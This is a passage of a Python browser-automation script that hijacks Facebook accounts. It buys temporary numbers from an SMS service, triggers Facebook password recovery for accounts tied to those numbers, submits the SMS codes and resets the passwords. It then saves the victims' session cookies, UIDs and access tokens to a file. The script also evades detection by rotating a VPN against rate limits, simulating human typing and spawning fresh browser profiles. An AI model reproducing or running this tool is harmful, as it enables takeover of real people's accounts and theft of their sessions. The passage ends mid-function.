    time.sleep(random.uniform(0.2, 0.4))
    element.hover(timeout=timeout_ms)
    time.sleep(random.uniform(0.15, 0.35))
    element.click(timeout=timeout_ms)


def delete_failed_number(page: Page) -> None:
    """Delete the most recently purchased number (failed one) from the table."""
    # Disabled per user request (number deletion skipped)
    print("\n🗑️  Number deletion skipped (disabled per configuration)")
    pass


def select_service_and_country(page: Page) -> bool:
    close_cookies_if_needed(page)
    print("\n🤖 Ensuring service and country are selected...")
    try:

        print(f"Selecting service: {CONFIG.service_text}...")
        service_btn = page.get_by_text(re.compile(f"^{CONFIG.service_text}$", re.I)).first
        try:
            service_btn.click(timeout=3000)
        except Exception:
            service_btn.click(timeout=3000, force=True)
            
        time.sleep(1.5)
        
        print(f"Selecting country: {CONFIG.country_text}...")
        try:
            search_input = page.get_by_placeholder(re.compile("country", re.I)).first
            if search_input.is_visible(timeout=2000):
                search_input.fill(CONFIG.country_text)
                time.sleep(1)
        except Exception:
            pass
        
        # Make the country selector more robust by looking for list items or divs that contain the text
        country_btn = page.locator(f"li:has-text('{CONFIG.country_text}'), div[role='button']:has-text('{CONFIG.country_text}')").first
        if not country_btn.is_visible(timeout=2000):
            # Broader fallback: Just find the text and click it
            country_btn = page.get_by_text(re.compile(f"^{CONFIG.country_text}$", re.I)).first
            if not country_btn.is_visible(timeout=2000):
                country_btn = page.locator(f"text='{CONFIG.country_text}'").locator("visible=true").first
             
        try:
            country_btn.click(timeout=5000)
        except Exception:
            country_btn.click(timeout=5000, force=True)
            
        time.sleep(1.5)
        return True
    except Exception as e:
        print(f"⚠️ Could not select service/country automatically: {e}")
        return False


def wait_for_sms_code(page: Page, fb_page: Page = None, timeout_sec: int = 180) -> str:
    print(f"\n⏳ Waiting up to {timeout_sec} seconds for SMS code to arrive on Hero SMS...")
    start_time = time.time()
    
    last_refresh_time = start_time
    
    while time.time() - start_time < timeout_sec:
        # Check if the Facebook tab in the background has thrown a CAPTCHA verification check
        if fb_page:
            try:
                captcha_iframe = fb_page.locator("iframe[src*='recaptcha'], iframe[title*='recaptcha'], iframe[src*='captcha'], .g-recaptcha").first
                captcha_text = fb_page.get_by_text(re.compile("Help us confirm|Confirm it's you|Confirm that it's you", re.I)).first
                if captcha_iframe.is_visible(timeout=500) or captcha_text.is_visible(timeout=500):
                    print("\a\a\a") # Play console alert beeps
                    print("\n🚨🚨🚨 CAPTCHA DETECTED ON FACEBOOK TAB! 🚨🚨🚨")
                    print("🛑 AUTOMATION PAUSED. Bringing Facebook tab to front. Please solve it manually...")
                    fb_page.bring_to_front()
                    if captcha_iframe.is_visible():
                        captcha_iframe.wait_for(state="hidden", timeout=300_000)
                    else:
                        captcha_text.wait_for(state="hidden", timeout=300_000)
                    print("✅ CAPTCHA solved! Returning to Hero SMS window to wait for SMS...")
                    page.bring_to_front()
                    # Reset the start time so the user gets a full 180 seconds wait window starting NOW!
                    start_time = time.time()
                    last_refresh_time = start_time
                    time.sleep(3)
            except Exception as ce:
                # Silently ignore checks to prevent loop crashes
                pass

        try:
            row = page.locator("tbody tr:first-child").first
            text = row.inner_text(timeout=5000)
            
            if "SMS Code:" in text:
                match = re.search(r"SMS Code:\s*(\d+)", text, re.I)
                if match:
                    code = match.group(1)
                    print(f"✅ Received SMS Code: {code}")
                    return code
            
            # Click refresh every ~30 seconds if still waiting
            if time.time() - last_refresh_time > 30:
                try:
                    # The refresh button is usually a circular arrow icon before the X button
                    refresh_btn = row.locator("button").filter(has=page.locator("svg:not([class*='close'])")).first
                    if refresh_btn.is_visible():
                        refresh_btn.click(timeout=3000)
                        print("🔄 Clicked refresh icon for the number...")
                        last_refresh_time = time.time()
                except Exception:
                    pass
                    
        except Exception as e:
            # Ignore minor errors while polling (like row not fully loaded)
            pass
            
        time.sleep(3)
        
    raise RuntimeError(f"Timeout: No SMS code received after {timeout_sec} seconds.")


def handle_post_verification(context, target: Page) -> tuple[str, str]:
    print("\n⏳ Waiting for Facebook to process the code...")
    password_to_use = getattr(CONFIG, 'new_password', "HeroSmsRecover123!")
    
    try:
        # We will poll for up to 30 seconds to see where Facebook sends us
        for _ in range(15):
            # Scenario 1: Password Reset Page
            try:
                # Facebook sometimes renders the new password field as type="text" instead of type="password"
                # so we need to look for specific IDs or names in addition to the type.
                password_input = target.locator("input[type='password'], input[id*='password'], input[name*='password'], input[placeholder*='New Password' i]").first
                if password_input.is_visible(timeout=500):
                    print("\n🔑 Password reset required. Setting a new password...")
                    password_to_use = CONFIG.new_password
                    if not password_to_use:
                        import string
                        import random
                        chars = string.ascii_letters + string.digits + "!@#$%^&*"
                        password_to_use = ''.join(random.choice(chars) for _ in range(16))
                        
                    print(f"Typing new password: {password_to_use}")
                    human_type(password_input, password_to_use)
                    time.sleep(1)
                    
                    submit_success = False
                    try:
                        # Broad check matching both <button> and <input> tags
                        continue_btn = target.locator("button[name='reset_action'], input[name='reset_action'], button[type='submit'], input[type='submit'], button[name='did_submit'], input[name='did_submit'], button[name='btn_continue'], input[name='btn_continue']").first
                        
                        if continue_btn.is_visible(timeout=2000):
                            human_click(continue_btn, timeout_ms=5000)
                            print("✅ Clicked Submit to set password!")
                            submit_success = True
                        else:
                            # Try text-based matching for English/Spanish
                            continue_btn = target.get_by_role("button", name=re.compile("Continue|Continuar", re.I)).first
                            if not continue_btn.is_visible(timeout=1000):
                                continue_btn = target.locator("button, a[role='button']").filter(has_text=re.compile("Continue|Continuar", re.I)).first
                                
                            if continue_btn.is_visible(timeout=1000):
                                human_click(continue_btn, timeout_ms=5000)
                                print("✅ Clicked text-matching Submit to set password!")
                                submit_success = True
                            else:
                                print("🔍 Falling back to language-agnostic structural button search...")
                                continue_btn = target.locator("form button[type='submit'], form input[type='submit'], button._42ft._4jy0._4jy3._4jy1._51sy").first
                                if continue_btn.is_visible(timeout=1000):
                                    human_click(continue_btn, timeout_ms=5000)
                                    print("✅ Clicked structural fallback Submit to set password!")
                                    submit_success = True
                    except Exception as e:
                        print(f"⚠️ Could not click Submit: {e}")
                    
                    if not submit_success:
                        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
                        try:
                            target.evaluate("document.querySelector('form').submit()")
                            print("✅ Submitted password reset form successfully via JS!")
                            submit_success = True
                        except Exception as js_err:
                            print(f"❌ JS form submit failed: {js_err}")
                            
                    if submit_success:
                        time.sleep(5)
                        return "success", password_to_use
                    else:
                        print("❌ Password reset form submission failed completely.")
                        return "blocked", ""
            except Exception:
                pass
                
            # Scenario 2: Main Feed (Logged in directly)
            try:
                # Look for common Facebook main feed elements
                if target.locator("svg[aria-label='Facebook']").is_visible(timeout=500) or \
                   target.locator("input[placeholder='Search Facebook']").is_visible(timeout=500) or \
                   target.locator("a[aria-label='Home']").is_visible(timeout=500):
                    print("\n✅ Automatically logged in to main page without password reset!")
                    return "success", "Not changed (Logged in directly)"
            except Exception:
                pass
                
            # Scenario 3: 2FA Authentication App required
            try:
                # Structural check for 2FA forms or specific text
                if target.locator("form[action*='two_factor'], input[name='approvals_code']").is_visible(timeout=500) or \
                   target.get_by_text(re.compile("Go to the authentication app|aplicativo de autenticação|雙重驗證|双重验证", re.I)).first.is_visible(timeout=500):
                    print("\n🔐 2FA Authentication App required! This is considered a SUCCESSFUL recovery.")
                    return "2fa", password_to_use
            except Exception:
                pass
                
            # Scenario 4: Account Locked/Checkpoint or Suspended
            try:
                # Structural check for checkpoints (e.g., "Account suspended", "Help us confirm", "Upload ID")
                if target.url and "checkpoint" in target.url.lower():
                    print("\n❌ Account is locked in a Facebook Checkpoint. Moving to next number...")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
                # Explicitly check for suspension screen
                if target.get_by_text(re.compile("We suspended your account|Suspendemos sua conta|停用了您的帳戶|停用了你的帳戶|Suspendimos tu cuenta", re.I)).first.is_visible(timeout=500):
                    print("\n❌ Account is SUSPENDED. Moving to next number...")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
                # Explicitly check for "Check your notifications on another device" screen
                if target.get_by_text(re.compile("Aguardando aprovação|Verifique suas notificações|Check your notifications|Approve the login|核准登入|確認登入|確認您的登入|在其他裝置|在其他设备", re.I)).first.is_visible(timeout=500):
                    print("\n❌ Login approval from another device required! We cannot bypass this.")
                    print("🧹 Clearing Facebook cookies to force logout...")
                    context.clear_cookies(domain=".facebook.com")
                    context.clear_cookies(domain="www.facebook.com")
                    return "blocked", ""
                    
            except Exception:
                pass
                
            time.sleep(2)
            
        print("⚠️ Timed out waiting for post-verification state. We might be stuck on an intermediate page.")
        # Return True anyway to try extracting the session just in case we are logged in
        return "success", "Unknown state (Timed out)"
        
    except Exception as e:
        print(f"❌ Error during post-verification: {e}")
        return "blocked", ""


def submit_facebook_code(target: Page, code: str) -> bool:
    print(f"\n📝 Submitting code {code} to Facebook...")
    try:
        # Enter code input field - use structural matching first
        code_input = target.locator("input[name='n'], #recovery_code_entry, input[type='text'], input[type='number']").first
        if not code_input.is_visible(timeout=2000):
            code_input = target.get_by_role("textbox", name=re.compile("Enter code|Insira o código|輸入驗證碼|輸入代碼", re.I)).first
            if not code_input.is_visible(timeout=1000):
                code_input = target.get_by_placeholder(re.compile("Enter code|Insira o código|輸入驗證碼|輸入代碼", re.I)).first

        human_type(code_input, code)
        time.sleep(1)
        
        # Click continue - use broad tag-agnostic matching
        continue_btn = target.locator("button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
        if not continue_btn.is_visible(timeout=2000):
            continue_btn = target.get_by_role("button", name=re.compile("Continue|Continuar|繼續|继续|Avançar|Avançar", re.I)).first
        
        human_click(continue_btn, timeout_ms=10000)
        print("✅ Clicked Submit to verify code!")
        time.sleep(5)
        return True
    except Exception as e:
        print(f"❌ Error submitting code to Facebook: {e}")
        return False


def wait_for_login_complete(target: Page) -> bool:
    """Wait for Facebook to fully log in after code verification."""
    print("\n⏳ Waiting for Facebook to complete login...")
    
    try:
        # Wait for the page to redirect/settle after code submission
        # Usually redirects to https://www.facebook.com/home.php or dashboard
        target.wait_for_url(re.compile(r"facebook\.com/(home|checkpoint)"), timeout=30000)
        
        print("✅ Login appears to be complete!")
        
        # Give it a few more seconds to settle
        time.sleep(5)
        
        # Check if we're at a profile/home page
        try:
            # Look for indicators we're logged in
            profile_link = target.locator("[href*='/profile']").first
            if profile_link.is_visible(timeout=3000):
                print("✅ Profile link visible - account is logged in!")
                return True
        except:
            pass
        
        # If we can find the main feed or any logged-in indicator
        try:
            feed = target.locator("[role='feed'], [data-pagelet='FeedStream']").first
            if feed.is_visible(timeout=3000):
                print("✅ Feed visible - account is logged in!")
                return True
        except:
            pass
        
        print("✅ Account login successful (page redirected)")
        return True
        
    except Exception as e:
        print(f"⚠️ Timeout waiting for login: {e}")
        print("Proceeding anyway to extract session data...")
        return True


def extract_session_data(context, target: Page, phone_number: str, password_used: str, profile_name: str, two_fa: str = "") -> None:
    print("\n🍪 Extracting session cookies and tokens...")
    time.sleep(5) # Wait for login to complete
    
    try:
        # 1. Extract Cookies
        cookies = context.cookies("https://www.facebook.com")
        cookie_string = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
        
        # 2. Extract Access Token (EAAB...)
        # Often found in the page source inside a script tag
        content = target.content()
        token_match = re.search(r'EAAB\w+', content)
        access_token = token_match.group(0) if token_match else "Token not found"
        
        # Find the Facebook UID (c_user cookie)
        uid = phone_number
        for c in cookies:
            if c['name'] == 'c_user':
                uid = c['value']
                break
                
        # 3. Save to file in an aligned table format
        # We pad the strings with spaces so the pipes line up perfectly vertically.
        uid_padded = str(uid).ljust(18)
        pass_padded = str(password_used).ljust(20)
        two_fa_padded = str(two_fa if two_fa else "").ljust(5)
        
        # Get current date and time
        from datetime import datetime
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        output_data = f"--- Recovered Account [{current_time} | {profile_name} ] ---\n"
        output_data += f"{uid_padded} | {pass_padded} | {two_fa_padded} | {cookie_string}\n"
        output_data += "--------------------------------------------------------\n\n"
        
        with open(CONFIG.output_file, "a", encoding="utf-8") as f:
            f.write(output_data)
            
        print(f"✅ Session data extracted and saved to {CONFIG.output_file}")
        if access_token != "Token not found":
            print(f"🔑 Found Token: {access_token[:15]}...")
            
    except Exception as e:
        print(f"❌ Error extracting session data: {e}")


def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
    pages = context.pages
    target = pages[0] if pages else context.new_page()
    target.goto(CONFIG.target_url, wait_until="domcontentloaded")
    target.bring_to_front()
    
    # Check if Facebook is already logged in (meaning we were redirected away from identify to feed/home page)
    is_logged_in = False
    try:
        fb_cookies = context.cookies("https://www.facebook.com")
        c_user = next((c for c in fb_cookies if c['name'] == 'c_user'), None)
        if c_user:
            is_logged_in = True
            print(f"⚠️  Detected logged-in Facebook user (UID: {c_user['value']}) on target page!")
    except Exception:
        pass
        
    if not is_logged_in:
        try:
            if target.locator("div[role='feed'], [data-pagelet='TopNav'], div[aria-label][role='navigation']").first.is_visible(timeout=2000):
                is_logged_in = True
                print("⚠️  Detected active Facebook session on target page layout!")
        except Exception:
            pass
            
    if is_logged_in:
        raise RuntimeError("Target profile is already logged in to Facebook. Skipping to preserve the recovered account session.")
            
    print(f"\n📝 Filling phone number into Facebook recovery page: {phone_number}")
    
    # Fill the phone number
    input_field = target.locator(CONFIG.target_phone_selector).first
    human_type(input_field, phone_number)
    time.sleep(1)
    
    # Verify the number was actually filled in
    filled_value = input_field.input_value(timeout=5_000)
    print(f"✅ Verified filled value: '{filled_value}'")
    
    if not filled_value or filled_value.strip() == "":
        print("⚠️  WARNING: Field appears empty after filling!")
        print(f"Attempting to fill again...")
        time.sleep(1)
        human_type(input_field, phone_number)
        time.sleep(1)
    
    print("\n🔘 Clicking Submit button...")
    submit_success = False
    try:
        # Broad, language-agnostic locator for both button and input tags on recovery form
        continue_button = target.locator("button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
        
        if continue_button.is_visible(timeout=2000):
            human_click(continue_button, timeout_ms=5000)
            print("✅ Clicked Submit button successfully!")
            submit_success = True
    except Exception as e:
        print(f"⚠️ Could not click Submit button: {e}")
        
    if not submit_success:
        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
        try:
            target.evaluate("document.querySelector('form').submit()")
            print("✅ Submitted form successfully via JS!")
            submit_success = True
        except Exception as js_err:
            print(f"❌ JS form submit failed: {js_err}")
            
    if not submit_success:
        target.close()
        return "error", None
        
    time.sleep(3)
    
    print("⏳ Waiting for Facebook to process the number...")
    digits_only = "".join([c for c in phone_number if c.isdigit()])
    last_two = digits_only[-2:] if len(digits_only) >= 2 else ""
    
    max_waits = 15
    for i in range(max_waits):
        # 1. Check for CAPTCHA (Using iframes or text)
        try:
            captcha_iframe = target.locator("iframe[src*='recaptcha'], iframe[title*='recaptcha'], iframe[src*='captcha'], .g-recaptcha").first
            captcha_text = target.get_by_text(re.compile("Help us confirm|Confirm it's you|Confirm that it's you", re.I)).first
            if captcha_iframe.is_visible(timeout=500) or captcha_text.is_visible(timeout=500):
                print("\a\a\a") # Play console alert beep
                print("\n🚨🚨🚨 CAPTCHA DETECTED! 🚨🚨🚨")
                print("🛑 AUTOMATION PAUSED. Please solve the CAPTCHA manually in the browser window.")
                print("⏳ The script will automatically resume once the CAPTCHA popup is solved and disappears...")
                if captcha_iframe.is_visible():
                    captcha_iframe.wait_for(state="hidden", timeout=300_000)
                else:
                    captcha_text.wait_for(state="hidden", timeout=300_000)
                print("✅ CAPTCHA solved! Resuming script...")
                time.sleep(3)
        except Exception:
            pass

        # 1b. Check for "Choose your account" multiple accounts list screen (Language-Agnostic)
        try:
            # We look for a container structured as a list with multiple options/anchors/buttons.
            # On Facebook's account identification page, this is represented by list item wrapper cards.
            list_container = target.locator("div[role='list'], div._85el, div[class*='account']").first
            
            # The page title for choosing accounts has a back arrow (< button) at the top of the card layout
            back_arrow = target.locator("a[href*='identify'], div[aria-label][role='button'] i.header, i[class*='back'], i[class*='arrow']").first
            
            # If a list container is present, and it holds 2 or more clickable profile items:
            if list_container.is_visible(timeout=500):
                profile_items = list_container.locator("a, [role='listitem'], [role='button'], div[class*='card']").all()
                if len(profile_items) >= 2:
                    print("\n👥 Multiple accounts matched this number! ('Choose your account' structural layout detected)")
                    print("🖱️ Automatically clicking the first matching Facebook profile card...")
                    
                    # Click the first item
                    try:
                        profile_items[0].click(timeout=5000)
                    except Exception:
                        # Fallback click method
                        profile_items[0].click(timeout=5000, force=True)
                    time.sleep(3)
        except Exception as choose_err:
            print(f"⚠️ Error handling 'Choose your account' screen: {choose_err}")
            
        # 2. Check for Error State (e.g., "No account found" or "Request Couldn't be Processed")
        try:
            # Check for specific 'Request Couldn't be Processed' rate limit screen
            error_page = target.get_by_text(re.compile("Request Couldn't be Processed|problem with this request|não foi possível processar|Não foi possível processar", re.I)).first
            if error_page.is_visible(timeout=500):
                print("\n⚠️ Facebook IP Rate Limit / Block Screen Detected ('Your Request Couldn't Be Processed')!")
                print("🧹 Clearing Facebook cookies to reset session state...")
                try: context.clear_cookies()
                except: pass
                return "rate_limited", target
                
            # Check for standard alert boxes
            alert_box = target.locator("div[role='alert'], .pam.login_error_box, #error_box").first
            if alert_box.is_visible(timeout=500):
                try:
                    error_text = alert_box.inner_text().strip()
                except:
                    error_text = "Unknown Error"
                
                if "try again later" in error_text.lower() or "problem with this request" in error_text.lower():
                    print(f"⚠️ Rate limited or blocked by Facebook: '{error_text}'")
                    return "rate_limited", target
                else:
                    print(f"❌ Error: Detected an error alert on the page: '{error_text}'")
                    return "not_found", target
        except Exception:
            pass
            
        # 3. Check for Checkpoint/Identity Lock
        try:
            if target.url and "checkpoint" in target.url.lower():
                print("\n❌ Account is locked in a Facebook Checkpoint (Identity Confirm)!")
                print("🧹 Clearing Facebook cookies to force logout...")
                context.clear_cookies()
                print("🔴 Leaving Facebook tab open for next attempt...")
                return "not_found", target
        except Exception:
            pass
            
        # 3. Check for Options State ("Choose a way to log in")
        # We look for radio buttons
        try:
            if target.locator("input[type='radio'], [role='radio']").count() > 0:
                print("\n✅ Found radio button options (Choose a way to log in)!")
                if not last_two:
                    print("⚠️ Could not extract last 2 digits. Cannot proceed automatically.")
                    return "success", target
                    
                print(f"🔍 Looking for an option ending in '{last_two}'...")
                
                found_match = False
                # Look in labels, radios, buttons, or any generic div
                for selector in ["label", "[role='radio']", "div[role='button']", "div.uiInputLabel", "div.row", "div"]:
                    options = target.locator(selector).all()
                    for opt in options:
                        try:
                            text = opt.inner_text().strip()
                            # Language-agnostic digit-matching check
                            if 5 < len(text) < 150:
                                digits_in_text = ''.join([c for c in text if c.isdigit()])
                                if digits_in_text and digits_in_text.endswith(last_two):
                                    print(f"🎯 Match found! Option: '{text.replace(chr(10), ' ')}'")
                                    opt.click(timeout=5000)
                                    time.sleep(1)
                                    found_match = True
                                    break
                        except:
                            pass
                    if found_match:
                        break
                        
                if found_match:
                    print("🔘 Clicking Submit...")
                    submit_success = False
                    try:
                        # Broad, tag-agnostic locator for submit button
                        continue_btn = target.locator("button[name='reset_action'], input[name='reset_action'], button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
                        if continue_btn.is_visible(timeout=2000):
                            human_click(continue_btn, timeout_ms=5000)
                            print("✅ Account recovery code requested successfully!")
                            submit_success = True
                    except Exception as e:
                        print(f"⚠️ Could not click Submit after selecting option: {e}")
                        
                    if not submit_success:
                        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
                        try:
                            target.evaluate("document.querySelector('form').submit()")
                            print("✅ Submitted options form successfully via JS!")
                            submit_success = True
                        except Exception as js_err:
                            print(f"❌ JS form submit failed: {js_err}")
                            
                    if submit_success:
                        time.sleep(3)
                        return "success", target
                    else:
                        return "error", target
                else:
                    print(f"❌ No SMS option found ending with '{last_two}'.")
                    print("Leaving tab open and retrying with a new number...")
                    return "not_found", target
        except Exception:
            pass
                
        # 4. Check for Code Entry State ("Confirm your account")
        # We look for the standard code input box (name='n' or id='recovery_code_entry')
        try:
            code_input = target.locator("input[name='n'], #recovery_code_entry").first
            if code_input.is_visible(timeout=500):
                print("\n✅ Facebook went straight to the code entry screen!")
                return "success", target
        except Exception:
            pass
            
        time.sleep(2)
        
    print("⚠️ Timed out waiting for Facebook response.")
    return "error", target


def rotate_vpn_if_configured() -> None:
    vpn_name = getattr(CONFIG, 'vpn_connection_name', '')
    if not vpn_name:
        return
    try:
        import subprocess
        import time
        print(f"\n🔌 [VPN] Disconnecting Windows VPN connection '{vpn_name}'...")
        subprocess.run(f'rasdial "{vpn_name}" /disconnect', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        print(f"🔌 [VPN] Reconnecting Windows VPN connection '{vpn_name}' to rotate IP...")
        result = subprocess.run(f'rasdial "{vpn_name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print("✅ [VPN] VPN rotated and reconnected successfully!")
        else:
            print(f"⚠️ [VPN] VPN connection warning (Code {result.returncode}): {result.stderr or result.stdout}")
        time.sleep(5)
    except Exception as e:
        print(f"⚠️ [VPN] Error rotating VPN: {e}")


def main() -> None:
    session_start_time = time.time()
    try:
        with sync_playwright() as p:
            profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
            active_port = 9222
            browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")

            # Start session timers and counters
            session_start_time = time.time()
            accounts_recovered = 0
            total_numbers_tried = 0
            total_spent = 0.0
            
            # Calculate price per number from config
            price_match = re.search(r'\$?([0-9]+\.[0-9]+)', CONFIG.buy_text)
            price_per_sms = float(price_match.group(1)) if price_match else 0.099

            print("\n" + "="*60)
            print("HERO SMS AUTOMATION - AUTOMATIC MODE")
            print("="*60)
            
            # Identify current Chrome profile dynamically
            print("\n🔍 Identifying Chrome profile...")
            active_profile_name = getattr(CONFIG, 'chrome_profile_name', "Unknown Profile")
            current_folder_name = profile_name  # Default fallback
            try:
                version_page = context.new_page()
                version_page.goto("chrome://version", wait_until="domcontentloaded", timeout=10000)
                profile_path = version_page.locator("#profile_path").inner_text(timeout=5000)
                import os
                import json
                
                # This gets the internal folder name (e.g. "Profile 16")
                folder_name = os.path.basename(profile_path.strip('\\/'))
                current_folder_name = folder_name
                active_profile_name = folder_name
                
                # Now we look at the parent directory's Local State file to find the user-facing name ("test15")
                parent_dir = os.path.dirname(profile_path.strip('\\/'))
                local_state_path = os.path.join(parent_dir, "Local State")
                
                if os.path.exists(local_state_path):
                    try:
                        with open(local_state_path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            human_name = data.get('profile', {}).get('info_cache', {}).get(folder_name, {}).get('name')
                            if human_name:
                                active_profile_name = human_name
                    except Exception:
                        pass
                
                version_page.close()
                print(f"✅ Active Profile Detected: {active_profile_name} (Internal: {folder_name})")
            except Exception as e:
                print(f"⚠️ Could not automatically identify Chrome profile: {e}")
                try:
                    version_page.close()
                except:
                    pass
            
            # Facebook session checks are strictly isolated to the recovery browser context

            # Skip auto-login - user logs in manually
            print("\n[OK] Make sure you are already logged into Hero SMS in Chrome")
            
            hero = find_or_open_page(context, CONFIG.hero_url)
            hero.bring_to_front()
            
            print("\n⏳ Verifying Hero SMS login status...")
            try:
                # Check for common login indicators
                login_btn = hero.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
                login_title = hero.get_by_text(re.compile("Log in to your account", re.I)).first
                
                if login_btn.is_visible(timeout=3000) or login_title.is_visible(timeout=1000):
                    print("\n❌ You are NOT logged into Hero SMS!")
                    
                    # Check if auto_login is configured
                    if getattr(CONFIG, 'auto_login', False):
                        print("🤖 Auto-login is enabled. Running auto-login handler...")
                        try:
                            login_if_needed(context)
                        except Exception as ae:
                            print(f"⚠️ Auto-login handler encountered an error: {ae}")
                        
                    # Double-check status after auto-login handler run
                    if login_btn.is_visible(timeout=2000) or login_title.is_visible(timeout=1000):
                        if login_btn.is_visible():
                            print("🖱️ Auto-clicking 'Login / Register' to open the popup...")
                            try:
                                login_btn.click(timeout=2000)
                                time.sleep(1)
                            except Exception:
                                pass
                        
                        print("🛑 Auto-login could not complete (e.g. Cloudflare check needed). Please log in manually.")
                        print("⏳ The script will automatically resume once you are logged in and the 'Login / Register' button disappears...")
                        
                        # Wait for manual login fallback
                        if login_btn.is_visible():
                            login_btn.wait_for(state="hidden", timeout=300_000) # Wait up to 5 mins
                        else:
                            login_title.wait_for(state="hidden", timeout=300_000)
                            
                        print("\n✅ Login confirmed! Resuming automation...")
                        time.sleep(2) # Give the dashboard a moment to load
                    else:
                        print("\n✅ Auto-login verified! Resuming automation...")
                else:
                    print("✅ You are logged in!")
            except Exception as e:
                # Check login buttons again to be sure
                try:
                    if login_btn.is_visible(timeout=1000):
                        print(f"❌ Verification failed and login button is still visible: {e}")
                        raise e
                except:
                    pass
                print("✅ You are logged in!")
                
            print("\n🔍 Ensuring the 'Purchases' page is visible...")
            try:
                # Look for a navigation link to 'My purchases' or 'Purchases'
                purchases_btn = hero.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
                if purchases_btn.is_visible(timeout=2000):
                    purchases_btn.click()
                    time.sleep(2) # Give the table time to load
                    print("✅ Navigated to Purchases page.")
            except Exception:
                pass

            fb_browser = None
            fb_port = None
            fb_page = None
            fb_profile_name = None
            fb_context = None

            max_attempts = 20
            attempt = 0
            success = False
            is_looping = getattr(CONFIG, 'multiple_accounts', False)
            
            while (attempt < max_attempts or is_looping) and not success:
                # Verify if browser connection is still active and hero page is open
                try:
                    check_stop_flag()
                    if not browser.is_connected() or hero.is_closed():
                        print("\n⚠️ Browser connection lost or Hero SMS tab was closed! Re-establishing connection...")
                        try:
                            browser.close()
                        except:
                            pass
                        close_chrome_on_port(active_port)
                        time.sleep(1)
                        profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
                        browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")
                        hero = find_or_open_page(context, CONFIG.hero_url)
                        hero.bring_to_front()
                except Exception as conn_err:
                    print(f"\n⚠️ Connection verification failed: {conn_err}. Re-launching Chrome...")
                    try:
                        try:
                            browser.close()
                        except:
                            pass
                        close_chrome_on_port(active_port)
                        time.sleep(1)
                        profile_name = getattr(CONFIG, 'chrome_profile_name', "Default")
                        browser, context, is_standalone = launch_and_connect_chrome(p, active_port, profile_name, user_data_subdir="chrome_profiles_hero")
                        hero = find_or_open_page(context, CONFIG.hero_url)
                        hero.bring_to_front()
                    except Exception as relaunch_err:
                        print(f"❌ Failed to re-launch Chrome: {relaunch_err}. Waiting 10 seconds before retrying...")
                        time.sleep(10)
                        continue

                attempt += 1
                rotate_vpn_if_configured()
                print(f"\n{'='*60}")
                print(f"Attempt {attempt}/{max_attempts}")
                print(f"{'='*60}")
                
                try:
                    # 1. PROACTIVELY set up the Facebook Chrome profile & page FIRST before spending any money!
                    if not is_placeholder_url(CONFIG.target_url):
                        try:
                            # Only launch a new Facebook Chrome window if it is not already running
                            if not fb_browser or not fb_browser.is_connected():
                                fb_profile_name = generate_next_profile_name()
                                import socket
                                def get_free_port():
                                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                                        s.bind(('127.0.0.1', 0))
                                        return s.getsockname()[1]
                                fb_port = get_free_port()
                                
                                print(f"\n🔄 Spawning separate Chrome profile '{fb_profile_name}' on port {fb_port} for Facebook recovery...")
                                fb_browser, fb_context, fb_is_standalone = launch_and_connect_chrome(p, fb_port, fb_profile_name, user_data_subdir="chrome_profiles_fb")
                            else:
                                print(f"\n🔄 Reusing running Chrome profile '{fb_profile_name}' for this attempt...")

                            fb_active_name = fb_profile_name
                            try:
                                local_state_path = os.path.join(get_official_chrome_user_data_dir(), "Local State")
                                if os.path.exists(local_state_path):
                                    with open(local_state_path, "r", encoding="utf-8") as f:
                                        state_data = json.load(f)
                                    h_name = state_data.get('profile', {}).get('info_cache', {}).get(fb_profile_name, {}).get('name')
                                    if h_name:
                                        fb_active_name = h_name
                            except:
                                pass

                            # Open a temporary target page to verify if we are logged in or blocked
                            # This verifies profile state WITHOUT submitting a phone number yet!
                            print("🔍 Verifying profile state before purchasing number...")
                            temp_page = fb_context.new_page()
                            temp_page.goto(CONFIG.target_url, wait_until="domcontentloaded")
                            
                            is_logged_in = False
                            try:
                                fb_cookies = fb_context.cookies("https://www.facebook.com")
                                if any(c['name'] == 'c_user' for c in fb_cookies):
                                    is_logged_in = True
                            except:
                                pass
                                
                            if is_logged_in:
                                print(f"⚠️ Profile '{fb_profile_name}' already contains an active Facebook session!")
                                try: temp_page.close()
                                except: pass
                                raise RuntimeError("Target profile is already logged in to Facebook. Skipping to preserve session.")
                            
                            try: temp_page.close()
                            except: pass
                        except Exception as setup_err:
                            print(f"\n❌ Error during Facebook profile verification: {setup_err}")
                            if fb_browser:
                                try: fb_browser.close()
                                except: pass
                            if fb_port:
                                try: close_chrome_on_port(fb_port)
                                except: pass
                            
                            fb_browser = None
                            fb_page = None
                            fb_context = None
                            fb_port = None
                            fb_profile_name = None
                            
                            print("🔄 Retrying with a new profile index in next attempt...")
                            attempt += 1
                            continue

                    # 2. Now that the profile is confirmed clean and ready, proceed to buy a number!
                    # Navigate to Purchases page to note the current top number before buying
                    navigate_to_purchases(hero)
                    top_before = get_top_number(hero)
                    
                    # Navigate to Get code page
                    navigate_to_get_code(hero)
                    
                    # Ensure service and country are selected (in case of page refresh)
                    selection_success = select_service_and_country(hero)
                    if not selection_success:
